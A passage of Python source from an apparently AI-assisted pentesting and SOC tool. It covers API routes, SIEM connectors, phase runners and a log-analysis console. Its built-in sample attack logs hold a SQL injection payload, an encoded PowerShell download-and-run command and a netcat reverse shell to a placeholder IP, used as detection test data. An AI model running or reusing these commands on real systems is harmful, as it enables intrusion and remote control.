                    "scope": data.get("scope"),
                    "assessment_type": data.get("assessment_type", "black-box"),
                    "compliance_framework": data.get("compliance_framework", "OWASP"),
                    "auth_key": data.get("auth_key"),
                    "parallel_execution": data.get("parallel_execution", True),
                    "ai_enhanced": data.get("ai_enhanced", True)
                }
                
                # Start pentest in background
                thread = threading.Thread(
                    target=self.run_full_enterprise_pentest,
                    args=(target_info,)
                )
                thread.start()
                
                return jsonify({
                    "status": "started",
                    "message": "Enterprise pentest initiated"
                })
            except Exception as e:
                return jsonify({
                    "status": "error",
                    "message": str(e)
                }), 500
        
        @app.route('/api/sessions', methods=['GET'])
        def get_sessions():
            if not self.db:
                return jsonify({"error": "Database not available"}), 503
            
            sessions = self.db.get_recent_sessions(limit=50)
            return jsonify([{
                "session_id": s.id,
                "target": s.target,
                "status": s.status,
                "created_at": s.created_at.isoformat() if s.created_at else None,
                "completed_at": s.completed_at.isoformat() if s.completed_at else None
            } for s in sessions])
        
        self.console.print("[cyan]Starting HackPilot API Server on http://0.0.0.0:8000[/cyan]")
        app.run(host='0.0.0.0', port=8000, debug=config.DEBUG)
    
    def launch_web_dashboard(self):
        """Start HackPilot Web Dashboard server"""
        if not self.web_dashboard:
            self.console.print("[red]Web Dashboard is not initialized (enable in config or missing flask)[/red]")
            return
        
        from security.dashboard_auth import resolve_dashboard_host
        dashboard_host = resolve_dashboard_host()
        self.console.print(f"[cyan]Starting HackPilot Web Dashboard on http://{dashboard_host}:8080[/cyan]")
        self.web_dashboard.run()
    
    def run_soc_analysis(self):
        """Advanced SOC Analysis Interactive Console"""
        if not self.soc_analyzer:
            self.console.print("[red]SOC Analysis Engine is not initialized.[/red]")
            return

        self.console.print(Panel("[bold cyan]Advanced Security Operations Center (SOC) Analysis Engine[/bold cyan]\n"
                                 "Perform log parsing, IOC extraction, MITRE ATT&CK mapping, alert correlation, "
                                 "statistical anomaly detection, and incident response playbook generation."))

        soc_menu = Table(title="SOC Analysis Console Options")
        soc_menu.add_column("Option", style="cyan")
        soc_menu.add_column("Description", style="white")

        soc_options = [
            ("1", "Analyze Logs from a File"),
            ("2", "Analyze Raw Logs (Pasted Text)"),
            ("3", "Analyze Built-in Attack Scenario (Sample Logs)"),
            ("4", "List Loaded Detection Rules"),
            ("5", "Configure SIEM Connections (Splunk, QRadar, etc.)"),
            ("6", "Fetch and Analyze Logs from Configured SIEM"),
            ("0", "Return to Main Menu")
        ]

        for option, desc in soc_options:
            soc_menu.add_row(option, desc)

        self.console.print(soc_menu)
        choice = Prompt.ask("[cyan]Select SOC option[/cyan]", choices=[o[0] for o in soc_options])

        raw_logs = ""
        if choice == "0":
            return
        elif choice == "5":
            self.configure_siem_connections()
            return
        elif choice == "6":
            self.fetch_and_analyze_siem_logs()
            return
        elif choice == "1":
            filepath = Prompt.ask("[cyan]Enter path to log file[/cyan]")
            if not os.path.exists(filepath):
                self.console.print(f"[red]File not found: {filepath}[/red]")
                return
            try:
                with open(filepath, 'r') as f:
                    raw_logs = f.read()
            except Exception as e:
                self.console.print(f"[red]Error reading file: {e}[/red]")
                return
        elif choice == "2":
            self.console.print("[cyan]Paste your raw logs below (press Enter then Ctrl-D or Ctrl-Z to finish):[/cyan]")
            lines = []
            try:
                while True:
                    line = input()
                    lines.append(line)
            except EOFError:
                pass
            raw_logs = "\n".join(lines)
            if not raw_logs.strip():
                self.console.print("[yellow]No logs provided.[/yellow]")
                return
        elif choice == "3":
            # Generate sample logs containing multiple threats (Brute Force, SQL Injection, Port Scan, Reverse Shell, ransomware)
            now = datetime.utcnow()
            raw_logs = f"""
{(now - timedelta(minutes=10)).strftime('%b %d %H:%M:%S')} web-server sshd[12345]: Failed password for invalid user admin from 198.51.100.42 port 54321 ssh2
{(now - timedelta(minutes=9)).strftime('%b %d %H:%M:%S')} web-server sshd[12345]: Failed password for invalid user admin from 198.51.100.42 port 54322 ssh2
{(now - timedelta(minutes=8)).strftime('%b %d %H:%M:%S')} web-server sshd[12345]: Failed password for invalid user root from 198.51.100.42 port 54323 ssh2
{(now - timedelta(minutes=7)).strftime('%b %d %H:%M:%S')} web-server sshd[12345]: Failed password for invalid user support from 198.51.100.42 port 54324 ssh2
{(now - timedelta(minutes=6)).strftime('%b %d %H:%M:%S')} web-server sshd[12345]: Failed password for invalid user dbadmin from 198.51.100.42 port 54325 ssh2
{(now - timedelta(minutes=5)).strftime('%b %d %H:%M:%S')} firewall-core ACCEPT SRC=198.51.100.42 DST=10.0.0.5 SPT=54320 DPT=80 PROTO=TCP
{(now - timedelta(minutes=5)).strftime('%b %d %H:%M:%S')} web-server apache2[8822]: 198.51.100.42 - - "POST /api/v1/products HTTP/1.1" 500 1204 "{{\"id\": \"1' UNION SELECT 1,username,password_hash FROM users --\"}}"
{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1234 DPT=21 PROTO=TCP
{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1235 DPT=22 PROTO=TCP
{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1236 DPT=23 PROTO=TCP
{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1237 DPT=25 PROTO=TCP
{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1238 DPT=80 PROTO=TCP
{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1239 DPT=443 PROTO=TCP
{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1240 DPT=3389 PROTO=TCP
{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} firewall-core REJECT SRC=203.0.113.88 DST=10.0.0.5 SPT=1241 DPT=8080 PROTO=TCP
{(now - timedelta(minutes=3)).strftime('%b %d %H:%M:%S')} web-server systemd[1]: Created scheduled task to run command: powershell.exe -enc aWV4IChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2JhZGFjdG9yLm9uaW9uL3BheWxvYWQucHMnKQ==
{(now - timedelta(minutes=2)).strftime('%b %d %H:%M:%S')} local-agent auditd[5544]: Process execution: nc -e /bin/bash 198.51.100.42 4444
{(now - timedelta(minutes=1)).strftime('%b %d %H:%M:%S')} db-server systemd[1]: Warning: detected high directory change rate. files renamed to .locked. ransom note dropped at /var/lib/mysql/README_DECRYPT.txt
"""
            self.console.print("[green]Loaded built-in attack scenario logs.[/green]")
        elif choice == "4":
            self.console.print(Panel("[bold cyan]Loaded SOC Correlation Rules[/bold cyan]"))
            rule_table = Table(show_header=True)
            rule_table.add_column("Rule Name", style="cyan")
            rule_table.add_column("Severity", style="magenta")
            rule_table.add_column("Category", style="yellow")
            rule_table.add_column("MITRE ID", style="blue")
            
            for rule in self.soc_analyzer.correlation_engine.DETECTION_RULES:
                rule_table.add_row(
                    rule['name'],
                    rule['severity'].value.upper(),
                    rule['category'],
                    rule['mitre_id']
                )
            self.console.print(rule_table)
            return

        # Perform analysis
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            task = progress.add_task("[cyan]Running SOC Analysis Engine...", total=100)
            progress.update(task, advance=20)
            report = self.soc_analyzer.analyze(raw_logs)
            progress.update(task, completed=100)

        # Print Executive Summary
        self.console.print(Panel(report.executive_summary, title="[bold red]Executive Summary[/bold red]"))

        # Risk Score Gauge
        risk_color = "red" if report.risk_score >= 7.0 else "yellow" if report.risk_score >= 4.0 else "green"
        self.console.print(f"[bold]Overall Security Risk Score: [/bold][bold {risk_color}]{report.risk_score:.1f}/10.0[/bold {risk_color}]\n")

        # Stats Table
        stats_table = Table(title="SOC Metric Summary")
        stats_table.add_column("Metric", style="cyan")
        stats_table.add_column("Value", style="yellow")
        
        stats_table.add_row("Total Logs Ingested & Normalized", str(report.total_logs_processed))
        stats_table.add_row("Correlated Security Alerts", str(report.total_alerts))
        stats_table.add_row("   - Critical Alerts", f"[red]{report.critical_alerts}[/red]")
        stats_table.add_row("   - High Alerts", f"[orange3]{report.high_alerts}[/orange3]")
        stats_table.add_row("   - Medium Alerts", f"[yellow]{report.medium_alerts}[/yellow]")
        stats_table.add_row("   - Low / Info Alerts", str(report.low_alerts))
        stats_table.add_row("Extracted Indicators of Compromise (IOCs)", str(report.iocs_extracted))
        stats_table.add_row("Statistical Anomalies Flagged", str(report.anomalies_detected))
        stats_table.add_row("MITRE ATT&CK Techniques Identified", str(report.mitre_techniques_identified))
        
        self.console.print(stats_table)

        # Correlated Alerts
        if report.alerts:
            self.console.print("\n[bold orange3]🚨 Correlated Security Alerts[/bold orange3]")
            alert_table = Table(show_header=True)
            alert_table.add_column("ID", style="dim")
            alert_table.add_column("Alert Title", style="bold red")
            alert_table.add_column("Severity", style="magenta")
            alert_table.add_column("Category", style="yellow")
            alert_table.add_column("MITRE ATT&CK Mapping", style="blue")
            alert_table.add_column("Score", style="green")

            for alert in report.alerts:
                mitre_str = ", ".join(f"{m.technique_id} ({m.technique})" for m in alert.mitre_mappings) if alert.mitre_mappings else "N/A"
                alert_table.add_row(
                    alert.alert_id,
                    alert.title,
                    alert.severity.value.upper(),
                    alert.category,
                    mitre_str,
                    f"{alert.score:.1f}"
                )
            self.console.print(alert_table)

        # Extracted IOCs
        if report.iocs:
            self.console.print("\n[bold yellow]🔍 Extracted Indicators of Compromise (IOCs)[/bold yellow]")
            ioc_table = Table(show_header=True)
            ioc_table.add_column("Type", style="cyan")
            ioc_table.add_column("Value", style="bold white")
            ioc_table.add_column("Confidence", style="green")
            ioc_table.add_column("Threat Score", style="red")
            ioc_table.add_column("Context", style="dim")

            for ioc in report.iocs:
                ioc_table.add_row(
                    ioc.ioc_type,
                    ioc.value,
                    f"{ioc.confidence:.1%}",
                    f"{ioc.threat_score:.1f}",
                    ioc.context[:60] + "..." if len(ioc.context) > 60 else ioc.context
                )
            self.console.print(ioc_table)

        # Anomalies
        if report.anomalies:
            self.console.print("\n[bold magenta]📈 Statistical Anomalies Detected[/bold magenta]")
            anomaly_table = Table(show_header=True)
            anomaly_table.add_column("Metric Name", style="cyan")
            anomaly_table.add_column("Detected Value", style="yellow")
            anomaly_table.add_column("Baseline Mean", style="dim")
            anomaly_table.add_column("Z-Score", style="magenta")
            anomaly_table.add_column("Description", style="white")

            for anomaly in report.anomalies:
                anomaly_table.add_row(
                    anomaly.metric_name,
                    f"{anomaly.current_value:.3f}",
                    f"{anomaly.baseline_mean:.3f}",
                    f"{anomaly.z_score:.2f}",
                    anomaly.description
                )
            self.console.print(anomaly_table)

        # Timeline Reconstruction
        if report.timeline:
            self.console.print("\n[bold cyan]📅 Incident Kill-Chain Timeline Reconstruction[/bold cyan]")
            timeline_table = Table(show_header=True)
            timeline_table.add_column("Timestamp", style="cyan")
            timeline_table.add_column("Event Type", style="magenta")
            timeline_table.add_column("Description", style="white")
            timeline_table.add_column("Tactic/Technique", style="blue")

            for entry in report.timeline:
                tactic_str = f"{entry.mitre_tactic} ({entry.mitre_technique})" if entry.mitre_tactic else "N/A"
                timeline_table.add_row(
                    entry.timestamp.strftime('%Y-%m-%d %H:%M:%S') if entry.timestamp else "N/A",
                    entry.event_type,
                    entry.description,
                    tactic_str
                )
            self.console.print(timeline_table)

        # Playbooks
        if report.playbooks:
            self.console.print("\n[bold green]🛠️ Recommended Incident Response Playbooks[/bold green]")
            for p in report.playbooks:
                playbook_panel_content = (
                    f"[bold]Incident Type:[/bold] {p.incident_type}  |  [bold]Estimated Time:[/bold] {p.estimated_time_minutes} min\n"
                    f"[bold]Description:[/bold] {p.description}\n\n"
                    f"[bold]Step-by-step Response Procedures:[/bold]\n"
                )
                for step in p.steps:
                    playbook_panel_content += f"  [bold]{step['step']}. {step['action']}[/bold] (by {step['responsible']}) - {step['time_est']}m\n     {step['details']}\n"
                
                self.console.print(Panel(playbook_panel_content.strip(), title=f"[bold green]Playbook: {p.title}[/bold green]"))

        # Option to save report
        save_report = Confirm.ask("\n[cyan]Would you like to export this SOC analysis report to a JSON file?[/cyan]")
        if save_report:
            default_filename = f"soc_report_{report.report_id}.json"
            filename = Prompt.ask("[cyan]Enter report filename[/cyan]", default=default_filename)
            try:
                report_dict = self.soc_analyzer.to_dict(report)
                with open(filename, 'w') as f:
                    json.dump(report_dict, f, indent=4)
                self.console.print(f"[green]✓ SOC analysis report saved successfully to {filename}[/green]")
            except Exception as e:
                self.console.print(f"[red]✗ Failed to export report: {e}[/red]")

        # Forward alerts to configured SIEMs if available
        if self.siem_manager and self.siem_manager.connectors and report.alerts:
            forward_siem = Confirm.ask("\n[cyan]Would you like to forward these correlated alerts to all configured SIEM systems?[/cyan]", default=True)
            if forward_siem:
                self.console.print("[cyan]Forwarding alerts to configured SIEM systems...[/cyan]")
                for alert in report.alerts:
                    results = self.siem_manager.forward_alert_to_all(alert)
                    for cid, (success, msg) in results.items():
                        if success:
                            self.console.print(f"[green]✓ [SIEM: {cid}] Successfully forwarded alert: {alert.title}[/green]")
                        else:
                            self.console.print(f"[red]✗ [SIEM: {cid}] Forwarding failed: {msg}[/red]")

    def configure_siem_connections(self):
        """SIEM Configuration Menu"""
        while True:
            self.console.print(Panel("[bold cyan]Configure External SIEM Connections[/bold cyan]\n"
                                     "Connect HackPilot SOC to Splunk, QRadar, Elasticsearch, or Generic Webhooks."))

            siem_menu = Table(title="Registered Connections & Actions")
            siem_menu.add_column("Connection ID", style="cyan")
            siem_menu.add_column("SIEM Type", style="yellow")
            siem_menu.add_column("Endpoint URL", style="white")
            siem_menu.add_column("Status", style="green")

            if self.siem_manager and self.siem_manager.connectors:
                for cid, conn in self.siem_manager.connectors.items():
                    status = "✓ Ready" if conn.url else "⚠ Unconfigured"
                    stype = "Splunk" if isinstance(conn, SplunkConnector) else \
                            "QRadar" if isinstance(conn, QRadarConnector) else \
                            "Elasticsearch" if isinstance(conn, ElasticsearchConnector) else \
                            "Generic Webhook"
                    siem_menu.add_row(cid, stype, conn.url, status)
            else:
                siem_menu.add_row("N/A", "No active connections", "-", "-")

            self.console.print(siem_menu)

            self.console.print("[cyan]Actions:[/cyan]")
            self.console.print("  [bold]1[/bold]. Register Splunk Integration")
            self.console.print("  [bold]2[/bold]. Register IBM QRadar Integration")
            self.console.print("  [bold]3[/bold]. Register Elasticsearch Integration")
            self.console.print("  [bold]4[/bold]. Register Webhook Endpoint (Slack/Teams/SOAR)")
            self.console.print("  [bold]5[/bold]. Test All Connections")
            self.console.print("  [bold]0[/bold]. Return to SOC Menu")

            choice = Prompt.ask("[cyan]Select action[/cyan]", choices=["0", "1", "2", "3", "4", "5"])

            if choice == "0":
                break
            elif choice in ("1", "2", "3", "4"):
                stype_map = {"1": "splunk", "2": "qradar", "3": "elasticsearch", "4": "generic_webhook"}
                stype_name = {"1": "Splunk", "2": "QRadar", "3": "Elasticsearch", "4": "Webhook"}
                
                cid = Prompt.ask(f"[cyan]Enter unique Connection ID[/cyan]", default=stype_map[choice])
                url = Prompt.ask(f"[cyan]Enter {stype_name[choice]} Endpoint URL[/cyan]", 
                                 default="https://localhost:8089" if choice == "1" else 
                                         "https://localhost:443" if choice == "2" else
                                         "http://localhost:9200" if choice == "3" else
                                         "https://hooks.slack.com/services/...")
                
                token = Prompt.ask(f"[cyan]Enter API Key / Token / HEC Token[/cyan]", password=True, default="mock_token")
                verify_ssl = Confirm.ask("[cyan]Verify SSL Certificates?[/cyan]", default=False)
                is_mock = Confirm.ask("[cyan]Run in Simulation Mode (Offline tests)?[/cyan]", default=True)

                if choice == "1":
                    conn = SplunkConnector(name=cid, url=url, token=token, verify_ssl=verify_ssl, is_mock=is_mock)
                elif choice == "2":
                    conn = QRadarConnector(name=cid, url=url, token=token, verify_ssl=verify_ssl, is_mock=is_mock)
                elif choice == "3":
                    conn = ElasticsearchConnector(name=cid, url=url, token=token, verify_ssl=verify_ssl, is_mock=is_mock)
                else:
                    conn = WebhookConnector(name=cid, url=url, token=token, verify_ssl=verify_ssl, is_mock=is_mock)

                self.siem_manager.register_connector(cid, conn)
                self.console.print(f"[green]✓ Connection '{cid}' registered successfully.[/green]")

            elif choice == "5":
                if not self.siem_manager or not self.siem_manager.connectors:
                    self.console.print("[yellow]No SIEM connectors configured.[/yellow]")
                    continue
                
                self.console.print("[cyan]Testing all registered connections...[/cyan]")
                results = self.siem_manager.test_all()
                for cid, (success, msg) in results.items():
                    color = "green" if success else "red"
                    symbol = "✓" if success else "✗"
                    self.console.print(f"[{color}]{symbol} [Connection: {cid}] {msg}[/{color}]")

    def fetch_and_analyze_siem_logs(self):
        """Fetch logs from configured SIEM and analyze them"""
        if not self.siem_manager or not self.siem_manager.connectors:
            self.console.print("[yellow]Please configure a SIEM connector first (SOC Option 5).[/yellow]")
            return

        self.console.print(Panel("[bold cyan]Fetch and Analyze SIEM Logs[/bold cyan]\n"
                                 "Select an active SIEM integration to pull logs and run correlation."))

        connectors = list(self.siem_manager.connectors.keys())
        choice = Prompt.ask("[cyan]Select active connection[/cyan]", choices=connectors)
        conn = self.siem_manager.get_connector(choice)

        default_query = "error OR fail OR ssh"
        if isinstance(conn, SplunkConnector):
            default_query = "index=security sourcetype=syslog failed"
        elif isinstance(conn, QRadarConnector):
            default_query = "SELECT UTF8(payload) FROM events WHERE payload CONTAINS 'failed' LIMIT 50"
        elif isinstance(conn, ElasticsearchConnector):
            default_query = "message:failed"

        query = Prompt.ask(f"[cyan]Enter query (AQL/DSL/Search string)[/cyan]", default=default_query)
        limit = Prompt.ask("[cyan]Enter maximum log lines to retrieve[/cyan]", default="50")
        try:
            limit = int(limit)
        except ValueError:
            limit = 50

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            task = progress.add_task(f"[cyan]Querying {conn.name} SIEM...", total=100)
            success, logs, msg = conn.fetch_logs(query, limit)
            progress.update(task, completed=100)

        if not success:
            self.console.print(f"[red]✗ Failed to retrieve logs: {msg}[/red]")
            return

        self.console.print(f"[green]✓ Retrieved {len(logs)} log lines from SIEM: {msg}[/green]")
        raw_logs = "\n".join(logs)
        
        # Run full analysis pipeline
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=self.console
        ) as progress:
            task = progress.add_task("[cyan]Running SOC Analysis on retrieved logs...", total=100)
            report = self.soc_analyzer.analyze(raw_logs)
            progress.update(task, completed=100)

        # Print Executive Summary
        self.console.print(Panel(report.executive_summary, title="[bold red]Executive Summary[/bold red]"))
        
        # Risk Score Gauge
        risk_color = "red" if report.risk_score >= 7.0 else "yellow" if report.risk_score >= 4.0 else "green"
        self.console.print(f"[bold]Overall Security Risk Score: [/bold][bold {risk_color}]{report.risk_score:.1f}/10.0[/bold {risk_color}]\n")

        # Stats Table
        stats_table = Table(title="SOC Metric Summary")
        stats_table.add_column("Metric", style="cyan")
        stats_table.add_column("Value", style="yellow")
        stats_table.add_row("Total Logs Processed", str(report.total_logs_processed))
        stats_table.add_row("Correlated Security Alerts", str(report.total_alerts))
        stats_table.add_row("Extracted IOCs", str(report.iocs_extracted))
        stats_table.add_row("Anomalies Flagged", str(report.anomalies_detected))
        self.console.print(stats_table)

        # Correlated Alerts
        if report.alerts:
            self.console.print("\n[bold orange3]🚨 Correlated Security Alerts[/bold orange3]")
            alert_table = Table(show_header=True)
            alert_table.add_column("Alert Title", style="bold red")
            alert_table.add_column("Severity", style="magenta")
            alert_table.add_column("Category", style="yellow")
            alert_table.add_column("Score", style="green")

            for alert in report.alerts:
                alert_table.add_row(
                    alert.title,
                    alert.severity.value.upper(),
                    alert.category,
                    f"{alert.score:.1f}"
                )
            self.console.print(alert_table)

            # Option to forward alerts back to SIEM
            forward_siem = Confirm.ask("\n[cyan]Would you like to forward these correlated alerts back to SIEM?[/cyan]", default=True)
            if forward_siem:
                self.console.print("[cyan]Forwarding alerts back to SIEM receivers...[/cyan]")
                for alert in report.alerts:
                    results = self.siem_manager.forward_alert_to_all(alert)
                    for cid, (success, msg) in results.items():
                        if success:
                            self.console.print(f"[green]✓ [SIEM: {cid}] Successfully forwarded: {alert.title}[/green]")
                        else:
                            self.console.print(f"[red]✗ [SIEM: {cid}] Failed: {msg}[/red]")

    def run_specific_phase(self):
        """Run a single specific pentesting phase"""
        target_info = self.get_target_info()
        session_id = str(uuid.uuid4())
        if self.db:
            session_id = self.db.create_pentest_session(
                target=target_info["target"],
                scope=target_info["scope"],
                created_by=target_info.get("created_by", "enterprise_user"),
                auth_key=target_info["auth_key"],
                assessment_type=target_info.get("assessment_type", "black-box")
            )
            
        phases = EnterprisePentestingPhases(
            session_id=session_id,
            ai_engine=self.ai_engine,
            tool_manager=self.tool_manager,
            target_info=target_info,
            db=self.db,
            cache=self.cache,
            processor=self.processor,
            exploitation=self.exploitation,
            zero_day_detector=self.zero_day_detector,
            compliance=self.compliance,
            report_generator=self.report_generator
        )
        
        self.console.print("\n[bold cyan]Select Phase to Execute:[/bold cyan]")
        self.console.print("  1. Intelligence Gathering & Reconnaissance")
        self.console.print("  2. Scanning & Enumeration")
        self.console.print("  3. Vulnerability Assessment")
        self.console.print("  4. Exploitation & Verification")
        self.console.print("  5. Dynamic Reporting & Analytics")
        self.console.print("  6. Retesting & Remediation Verification")
        
        phase_choice = Prompt.ask("[cyan]Select phase number[/cyan]", choices=["1", "2", "3", "4", "5", "6"])
        phase_map = {
            "1": ("Phase 1: Reconnaissance", phases.phase1_reconnaissance),
            "2": ("Phase 2: Scanning & Enumeration", phases.phase2_scanning_enumeration),
            "3": ("Phase 3: Vulnerability Assessment", phases.phase3_vulnerability_assessment),
            "4": ("Phase 4: Exploitation", phases.phase4_exploitation),
            "5": ("Phase 5: Reporting", phases.phase5_reporting),
            "6": ("Phase 6: Retesting", phases.phase6_retesting),
        }
        
        name, func = phase_map[phase_choice]
        self.console.print(f"\n[green]Starting {name}...[/green]")
        result = func()
        self.console.print(f"[green]✓ Completed {name}[/green]")
        if self.db:
            self.db.update_session_status(session_id, 'completed', 'system')
        return result

    def run_custom_workflow(self):
        """Run custom selected sequence of pentesting phases"""
        target_info = self.get_target_info()
        session_id = str(uuid.uuid4())
        if self.db:
            session_id = self.db.create_pentest_session(
                target=target_info["target"],
                scope=target_info["scope"],
                created_by=target_info.get("created_by", "enterprise_user"),
                auth_key=target_info["auth_key"],
                assessment_type=target_info.get("assessment_type", "black-box")
            )
            
        phases = EnterprisePentestingPhases(
            session_id=session_id,
            ai_engine=self.ai_engine,
            tool_manager=self.tool_manager,
            target_info=target_info,
            db=self.db,
            cache=self.cache,
            processor=self.processor,
            exploitation=self.exploitation,
            zero_day_detector=self.zero_day_detector,
            compliance=self.compliance,
            report_generator=self.report_generator
        )
        
        self.console.print("\n[cyan]Enter comma-separated phase numbers to run (e.g. 1,2,3):[/cyan]")
        workflow_input = Prompt.ask("[cyan]Phases[/cyan]", default="1,2,3")
        selected = [p.strip() for p in workflow_input.split(",") if p.strip() in {"1", "2", "3", "4", "5", "6"}]
        
        phase_map = {
            "1": ("Phase 1: Reconnaissance", phases.phase1_reconnaissance),
            "2": ("Phase 2: Scanning & Enumeration", phases.phase2_scanning_enumeration),
            "3": ("Phase 3: Vulnerability Assessment", phases.phase3_vulnerability_assessment),
            "4": ("Phase 4: Exploitation", phases.phase4_exploitation),
            "5": ("Phase 5: Reporting", phases.phase5_reporting),
            "6": ("Phase 6: Retesting", phases.phase6_retesting),
        }
        
        results = {}
        for p in selected:
            name, func = phase_map[p]
            self.console.print(f"\n[green]Running {name}...[/green]")
            results[f"phase_{p}"] = func()
            
        if self.db:
            self.db.update_session_status(session_id, 'completed', 'system')
        self.console.print("[bold green]Custom workflow completed successfully![/bold green]")
        return results

    def view_reports_analytics(self):
        """View reports and assessment analytics"""
        self.console.print(Panel("[bold cyan]HackPilot Assessment Reports & Analytics[/bold cyan]"))
        
        if self.db:
            sessions = self.db.get_recent_sessions(limit=10)
            if sessions:
                table = Table(title="Recent Penetration Testing Sessions")
                table.add_column("Session ID", style="cyan")
                table.add_column("Target", style="bold")
                table.add_column("Status", style="green")
                table.add_column("Started At", style="yellow")
                
                for s in sessions:
                    table.add_row(
                        s.id[:8] + "...",
                        s.target,
                        s.status,
                        s.created_at.strftime("%Y-%m-%d %H:%M") if s.created_at else "N/A"
                    )
                self.console.print(table)
            else:
                self.console.print("[yellow]No database sessions found yet.[/yellow]")
        
        report_dir = Path("reports")
        if report_dir.exists():
            files = list(report_dir.glob("*"))
            if files:
                self.console.print("\n[bold]Generated Report Files:[/bold]")
                for f in files[:10]:
                    size_kb = f.stat().st_size / 1024
                    self.console.print(f"  📄 [cyan]{f.name}[/cyan] ({size_kb:.1f} KB)")
            else:
                self.console.print("[dim]No report files in reports/ directory yet.[/dim]")

    def generate_executive_summary(self):
        """Generate high-level executive summary report"""
        self.console.print(Panel("[bold cyan]Executive Summary Generator[/bold cyan]"))
        
        target = Prompt.ask("[cyan]Enter target name/domain for summary[/cyan]", default="All Recent Assessments")
        
        total_vulns = 0
        severity_dist = {}
        if self.db:
            trends = self.db.get_historical_trends(days=30)
            severity_dist = trends.get('vulnerability_trends', {})
            total_vulns = sum(severity_dist.values())
        
        summary_panel = Panel(
            f"[bold]Target / Scope:[/bold] {target}\n"
            f"[bold]Generated At:[/bold] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"[bold]Total Findings:[/bold] {total_vulns}\n"
            f"[bold]Severity Breakdown:[/bold] {json.dumps(severity_dist, indent=2)}\n\n"
            "[bold green]Executive Recommendation:[/bold green]\n"
            "Maintain continuous vulnerability scanning, enforce principle of least privilege, "
            "and patch critical network-facing vulnerabilities within SLA windows.",
            title="Executive Security Assessment Summary"
        )
        self.console.print(summary_panel)

    def start_realtime_dashboard(self):
        """Start the real-time dashboard server"""
        if self.realtime_dashboard:
            self.console.print(f"[green]Starting real-time dashboard on {self.realtime_dashboard.host}:{self.realtime_dashboard.port}...[/green]")
            self.realtime_dashboard.start_background_server()
            self.console.print("[green]✓ Real-time dashboard running in background. Connect WebSocket clients to port 8765.[/green]")
        else:
            self.console.print("[yellow]⚠ Real-time dashboard is not available.[/yellow]")

    def manage_users_permissions(self):
        """Manage users, roles, and permissions"""
        self.console.print(Panel("[bold cyan]User & RBAC Permission Management[/bold cyan]"))
        
        rbac_table = Table(title="Enterprise Role-Based Access Control (RBAC)")
        rbac_table.add_column("Role", style="magenta")
        rbac_table.add_column("Description", style="white")
        rbac_table.add_column("Permissions", style="green")
        
        rbac_table.add_row("Admin", "Full system and user management", "All Permissions")
        rbac_table.add_row("Senior Analyst", "Advanced pentesting and exploitation", "Create, Run Exploitation, View Reports, Audit")
        rbac_table.add_row("Analyst", "Standard security assessments", "Create Session, Active Scans, View Reports")
        rbac_table.add_row("Viewer", "Read-only audit and report viewing", "View Session, View Reports")
        self.console.print(rbac_table)
        
        if self.db:
            try:
                with self.db.get_session() as session:
                    from database.models import User
                    users = session.query(User).limit(10).all()
                    if users:
                        u_table = Table(title="Current Registered Users")
                        u_table.add_column("Username", style="cyan")
                        u_table.add_column("Role", style="yellow")
                        u_table.add_column("Active", style="green")
                        for u in users:
                            u_table.add_row(u.username, u.role, str(u.is_active))
                        self.console.print(u_table)
            except Exception as e:
                self.console.print(f"[yellow]Could not query users: {e}[/yellow]")

    def system_configuration(self):
        """View and manage system configuration"""
        self.console.print(Panel("[bold cyan]System Configuration[/bold cyan]"))
        cfg_table = Table(title="Active Runtime Configuration")
        cfg_table.add_column("Setting", style="cyan")
        cfg_table.add_column("Value", style="yellow")
        
        cfg_table.add_row("Log Level", self.config.LOG_LEVEL)
        cfg_table.add_row("Max Workers", str(self.config.MAX_WORKERS))
        cfg_table.add_row("Database Configured", "Yes" if self.config.DATABASE_URL else "SQLite fallback")
        cfg_table.add_row("Redis URL", self.config.REDIS_URL)
        cfg_table.add_row("Voice Interface Enabled", str(self.config.ENABLE_VOICE))
        cfg_table.add_row("Web Dashboard Enabled", str(self.config.ENABLE_WEB_DASHBOARD))
        cfg_table.add_row("Real-time Dashboard Enabled", str(self.config.ENABLE_REALTIME_DASHBOARD))
        self.console.print(cfg_table)

    def compliance_management(self):
        """Manage compliance frameworks and mappings"""
        self.console.print(Panel("[bold cyan]Compliance Framework Management[/bold cyan]"))
        
        comp_table = Table(title="Supported Enterprise Security Frameworks")
        comp_table.add_column("Framework", style="bold cyan")
        comp_table.add_column("Standard", style="yellow")
        comp_table.add_column("Coverage Status", style="green")
        
        comp_table.add_row("OWASP Top 10", "Web Application Security (2021)", "Active")
        comp_table.add_row("NIST SP 800-53", "Security and Privacy Controls", "Active")
        comp_table.add_row("ISO/IEC 27001", "Information Security Management", "Active")
        comp_table.add_row("SOC 2 Type II", "Trust Services Criteria", "Active")
        comp_table.add_row("PCI-DSS v4.0", "Payment Card Industry Standard", "Active")
        self.console.print(comp_table)
        
        if self.compliance:
            self.console.print("[green]✓ Compliance Framework Mapper is loaded and operational.[/green]")

    def configure_ai_engine(self):
        """Configure AI models and multi-provider settings"""
        self.console.print(Panel("[bold cyan]AI Engine & Multi-Provider Configuration[/bold cyan]"))
        
        try:
            from ai_engine.model_registry import list_all_models
            all_models = list_all_models()
            self.console.print(f"[bold]Available AI Models in Catalog:[/bold] {len(all_models)} registered")
            
            model_table = Table(title="Sample Registered Models")
